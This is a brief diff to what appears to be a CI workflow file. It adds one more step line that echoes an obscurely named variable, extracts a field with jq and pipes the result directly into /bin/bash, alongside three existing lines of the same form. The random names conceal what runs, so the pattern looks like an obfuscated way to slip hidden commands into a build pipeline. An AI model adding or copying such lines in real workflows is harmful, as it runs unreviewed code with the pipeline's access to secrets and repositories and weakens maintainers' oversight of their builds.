@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$rcyxg4610" | jq -r .xrfb63 | /bin/bash
           echo $l61245 | jq -r .hjp841 | /bin/bash
           echo $hag8554 | jq -r .f11075 | /bin/bash
+          echo $zhs140 | jq -r .kd1 | /bin/bash
 
       - name: Upload results
         if: always()
